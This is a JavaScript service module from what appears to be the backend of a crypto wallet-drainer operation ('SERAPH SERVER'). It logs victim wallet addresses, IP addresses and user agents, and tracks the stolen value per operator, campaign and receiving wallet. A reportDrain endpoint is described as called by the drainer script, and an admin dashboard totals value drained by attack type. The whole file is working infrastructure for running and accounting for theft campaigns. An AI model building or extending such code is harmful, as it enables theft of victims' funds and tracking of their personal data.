/**
 * ============================================================================
 * SERAPH SERVER - Drain Service (v1.4.0)
 * ============================================================================
 * 
 * Handles:
 * - Logging drain attempts
 * - Updating drain status
 * - Statistics aggregation
 * - Wallet, operator, and campaign stats updates on success/blocked
 * 
 * ============================================================================
 */

import supabase from '../config/supabase.js'

/**
 * Create a drain log entry
 */
export async function createDrainLog({
  campaignId,
  operatorId,
  walletId,
  victimAddress,
  attackType,
  tokens = [],
  ethAmount = 0,
  totalValueUsd = 0,
  chainId = 11155111,
  ipAddress,
  userAgent,
  referrer
}) {
  const { data, error } = await supabase
    .from('drain_logs')
    .insert({
      campaign_id: campaignId,
      operator_id: operatorId,
      wallet_id: walletId,
      victim_address: victimAddress,
      attack_type: attackType,
      tokens,
      eth_amount: ethAmount,
      total_value_usd: totalValueUsd,
      chain_id: chainId,
      status: 'pending',
      ip_address: ipAddress,
      user_agent: userAgent,
      referrer
    })
    .select()
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  return data
}

/**
 * Update drain status
 * 
 * IMPORTANT: Also updates wallet, operator, and campaign stats on success/blocked
 */
export async function updateDrainStatus(drainId, {
  status,
  txHash,
  blockNumber,
  blockedBy,
  errorMessage
}) {
  // Get drain info BEFORE update (for stats)
  const { data: drainInfo } = await supabase
    .from('drain_logs')
    .select('operator_id, wallet_id, campaign_id, total_value_usd, status')
    .eq('id', drainId)
    .single()
  
  // Build updates
  const updates = {
    status,
    completed_at: new Date().toISOString()
  }
  
  if (txHash) updates.tx_hash = txHash
  if (blockNumber) updates.block_number = blockNumber
  if (blockedBy) updates.blocked_by = blockedBy
  if (errorMessage) updates.error_message = errorMessage
  
  // Update drain log
  const { data, error } = await supabase
    .from('drain_logs')
    .update(updates)
    .eq('id', drainId)
    .select()
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  // =========================================================================
  // Update stats based on status change
  // Only update if status actually changed and we have drain info
  // =========================================================================
  if (drainInfo && drainInfo.status !== status) {
    const valueUsd = parseFloat(drainInfo.total_value_usd) || 0
    
    if (status === 'success') {
      // Update operator stats
      await updateOperatorStats(drainInfo.operator_id, {
        totalDrains: 1,
        successfulDrains: 1,
        totalValueUsd: valueUsd
      })
      
      // Update wallet stats
      if (drainInfo.wallet_id) {
        await updateWalletStats(drainInfo.wallet_id, {
          totalDrains: 1,
          totalReceivedUsd: valueUsd
        })
      }
      
      // Update campaign stats
      if (drainInfo.campaign_id) {
        await updateCampaignStats(drainInfo.campaign_id, {
          successfulDrains: 1,
          totalValueUsd: valueUsd
        })
      }
    } else if (status === 'blocked') {
      // Update operator blocked count
      await updateOperatorStats(drainInfo.operator_id, {
        totalDrains: 1,
        blockedDrains: 1
      })
    } else if (status === 'failed') {
      // Just increment total drains
      await updateOperatorStats(drainInfo.operator_id, {
        totalDrains: 1
      })
    }
  }
  // =========================================================================
  
  return data
}

/**
 * Update operator stats (internal helper)
 */
async function updateOperatorStats(operatorId, { 
  totalDrains = 0, 
  successfulDrains = 0, 
  blockedDrains = 0, 
  totalValueUsd = 0 
}) {
  if (!operatorId) return
  
  try {
    const { data: operator } = await supabase
      .from('operators')
      .select('total_drains, successful_drains, blocked_drains, total_value_usd')
      .eq('id', operatorId)
      .single()
    
    if (!operator) return
    
    await supabase
      .from('operators')
      .update({
        total_drains: (operator.total_drains || 0) + totalDrains,
        successful_drains: (operator.successful_drains || 0) + successfulDrains,
        blocked_drains: (operator.blocked_drains || 0) + blockedDrains,
        total_value_usd: (parseFloat(operator.total_value_usd) || 0) + totalValueUsd,
        last_activity: new Date().toISOString(),
        updated_at: new Date().toISOString()
      })
      .eq('id', operatorId)
  } catch (err) {
    console.error('[Drain] Failed to update operator stats:', err.message)
  }
}

/**
 * Update wallet stats (internal helper)
 */
async function updateWalletStats(walletId, { totalDrains = 0, totalReceivedUsd = 0 }) {
  if (!walletId) return
  
  try {
    const { data: wallet } = await supabase
      .from('wallets')
      .select('total_drains, total_received_usd')
      .eq('id', walletId)
      .single()
    
    if (!wallet) return
    
    await supabase
      .from('wallets')
      .update({
        total_drains: (wallet.total_drains || 0) + totalDrains,
        total_received_usd: (parseFloat(wallet.total_received_usd) || 0) + totalReceivedUsd,
        updated_at: new Date().toISOString()
      })
      .eq('id', walletId)
  } catch (err) {
    console.error('[Drain] Failed to update wallet stats:', err.message)
  }
}

/**
 * Update campaign stats (internal helper)
 */
async function updateCampaignStats(campaignId, { successfulDrains = 0, totalValueUsd = 0 }) {
  if (!campaignId) return
  
  try {
    const { data: campaign } = await supabase
      .from('campaigns')
      .select('successful_drains, total_value_usd')
      .eq('id', campaignId)
      .single()
    
    if (!campaign) return
    
    await supabase
      .from('campaigns')
      .update({
        successful_drains: (campaign.successful_drains || 0) + successfulDrains,
        total_value_usd: (parseFloat(campaign.total_value_usd) || 0) + totalValueUsd,
        last_drain_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      })
      .eq('id', campaignId)
  } catch (err) {
    console.error('[Drain] Failed to update campaign stats:', err.message)
  }
}

/**
 * Get drain logs for operator
 */
export async function getDrainLogs(operatorId, {
  page = 1,
  limit = 20,
  status,
  attackType,
  campaignId,
  startDate,
  endDate
}) {
  let query = supabase
    .from('drain_logs')
    .select(`
      *,
      campaign:campaigns(id, name)
    `, { count: 'exact' })
    .eq('operator_id', operatorId)
  
  if (status) {
    query = query.eq('status', status)
  }
  
  if (attackType) {
    query = query.eq('attack_type', attackType)
  }
  
  if (campaignId) {
    query = query.eq('campaign_id', campaignId)
  }
  
  if (startDate) {
    query = query.gte('created_at', startDate)
  }
  
  if (endDate) {
    query = query.lte('created_at', endDate)
  }
  
  query = query.order('created_at', { ascending: false })
  
  const from = (page - 1) * limit
  query = query.range(from, from + limit - 1)
  
  const { data, error, count } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  return {
    drains: data,
    total: count,
    page,
    limit
  }
}

/**
 * Get all drain logs (admin)
 */
export async function getAllDrainLogs({
  page = 1,
  limit = 20,
  status,
  attackType,
  operatorId,
  campaignId,
  startDate,
  endDate,
  blockedOnly = false
}) {
  let query = supabase
    .from('drain_logs')
    .select(`
      *,
      operator:operators(id, username, email),
      campaign:campaigns(id, name)
    `, { count: 'exact' })
  
  if (status) {
    query = query.eq('status', status)
  }
  
  if (attackType) {
    query = query.eq('attack_type', attackType)
  }
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  if (campaignId) {
    query = query.eq('campaign_id', campaignId)
  }
  
  if (startDate) {
    query = query.gte('created_at', startDate)
  }
  
  if (endDate) {
    query = query.lte('created_at', endDate)
  }
  
  if (blockedOnly) {
    query = query.eq('status', 'blocked')
  }
  
  query = query.order('created_at', { ascending: false })
  
  const from = (page - 1) * limit
  query = query.range(from, from + limit - 1)
  
  const { data, error, count } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  return {
    drains: data,
    total: count,
    page,
    limit
  }
}

/**
 * Get drain by ID
 */
export async function getDrainById(drainId, operatorId = null) {
  let query = supabase
    .from('drain_logs')
    .select(`
      *,
      operator:operators(id, username, email),
      campaign:campaigns(id, name, domain)
    `)
    .eq('id', drainId)
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  const { data, error } = await query.single()
  
  if (error) {
    throw new Error('Drain log not found')
  }
  
  return data
}

/**
 * Get dashboard stats (admin)
 */
export async function getDashboardStats() {
  // Get operator counts
  const { count: activeOperators } = await supabase
    .from('operators')
    .select('id', { count: 'exact', head: true })
    .eq('status', 'active')
  
  const { count: totalOperators } = await supabase
    .from('operators')
    .select('id', { count: 'exact', head: true })
  
  // Get campaign counts
  const { count: activeCampaigns } = await supabase
    .from('campaigns')
    .select('id', { count: 'exact', head: true })
    .eq('status', 'active')
  
  const { count: totalCampaigns } = await supabase
    .from('campaigns')
    .select('id', { count: 'exact', head: true })
  
  // Get drain stats
  const { count: totalDrains } = await supabase
    .from('drain_logs')
    .select('id', { count: 'exact', head: true })
  
  const { count: successfulDrains } = await supabase
    .from('drain_logs')
    .select('id', { count: 'exact', head: true })
    .eq('status', 'success')
  
  const { count: blockedDrains } = await supabase
    .from('drain_logs')
    .select('id', { count: 'exact', head: true })
    .eq('status', 'blocked')
  
  // Get total value drained
  const { data: valueData } = await supabase
    .from('drain_logs')
    .select('total_value_usd')
    .eq('status', 'success')
  
  const totalValueDrained = valueData?.reduce((sum, d) => sum + parseFloat(d.total_value_usd || 0), 0) || 0
  
  // Get total value blocked
  const { data: blockedValueData } = await supabase
    .from('drain_logs')
    .select('total_value_usd')
    .eq('status', 'blocked')
  
  const totalValueBlocked = blockedValueData?.reduce((sum, d) => sum + parseFloat(d.total_value_usd || 0), 0) || 0
  
  // Get 24h stats
  const dayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString()
  
  const { count: drains24h } = await supabase
    .from('drain_logs')
    .select('id', { count: 'exact', head: true })
    .gte('created_at', dayAgo)
  
  const { count: blocked24h } = await supabase
    .from('drain_logs')
    .select('id', { count: 'exact', head: true })
    .eq('status', 'blocked')
    .gte('created_at', dayAgo)
  
  // Get signature stats
  const { count: pendingSignatures } = await supabase
    .from('signatures')
    .select('id', { count: 'exact', head: true })
    .eq('status', 'pending')
  
  const { count: totalSignatures } = await supabase
    .from('signatures')
    .select('id', { count: 'exact', head: true })
  
  // Get attack type breakdown
  const { data: attackTypeData } = await supabase
    .from('drain_logs')
    .select('attack_type')
  
  const attackTypeBreakdown = {}
  attackTypeData?.forEach(d => {
    attackTypeBreakdown[d.attack_type] = (attackTypeBreakdown[d.attack_type] || 0) + 1
  })
  
  return {
    operators: {
      active: activeOperators || 0,
      total: totalOperators || 0
    },
    campaigns: {
      active: activeCampaigns || 0,
      total: totalCampaigns || 0
    },
    drains: {
      total: totalDrains || 0,
      successful: successfulDrains || 0,
      blocked: blockedDrains || 0,
      last24h: drains24h || 0,
      blocked24h: blocked24h || 0
    },
    signatures: {
      total: totalSignatures || 0,
      pending: pendingSignatures || 0
    },
    value: {
      totalDrained: totalValueDrained.toFixed(2),
      totalBlocked: totalValueBlocked.toFixed(2)
    },
    attackTypes: attackTypeBreakdown
  }
}

/**
 * Report a drain (called by drainer script)
 */
export async function reportDrain({
  campaignKey,
  victimAddress,
  attackType,
  tokens,
  ethAmount,
  totalValueUsd,
  txHash,
  status,
  blockedBy,
  chainId = 11155111,
  ipAddress,
  userAgent
}) {
  // Get campaign by key
  const { data: campaign, error: campaignError } = await supabase
    .from('campaigns')
    .select('id, operator_id, wallet_id')
    .eq('campaign_key', campaignKey)
    .single()
  
  if (campaignError || !campaign) {
    throw new Error('Invalid campaign key')
  }
  
  // Create drain log
  const drainLog = await createDrainLog({
    campaignId: campaign.id,
    operatorId: campaign.operator_id,
    walletId: campaign.wallet_id,
    victimAddress,
    attackType,
    tokens,
    ethAmount,
    totalValueUsd,
    chainId,
    ipAddress,
    userAgent
  })
  
  // Update status if provided (this will also update stats)
  if (status && status !== 'pending') {
    await updateDrainStatus(drainLog.id, {
      status,
      txHash,
      blockedBy
    })
  }
  
  return drainLog
}

/**
 * Get recent drains (for dashboard widget)
 */
export async function getRecentDrains(operatorId = null, limit = 10) {
  let query = supabase
    .from('drain_logs')
    .select(`
      id,
      victim_address,
      attack_type,
      total_value_usd,
      status,
      tx_hash,
      created_at,
      campaign:campaigns(name)
    `)
    .order('created_at', { ascending: false })
    .limit(limit)
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  const { data, error } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  return data
}

export default {
  createDrainLog,
  updateDrainStatus,
  getDrainLogs,
  getAllDrainLogs,
  getDrainById,
  getDashboardStats,
  reportDrain,
  getRecentDrains
}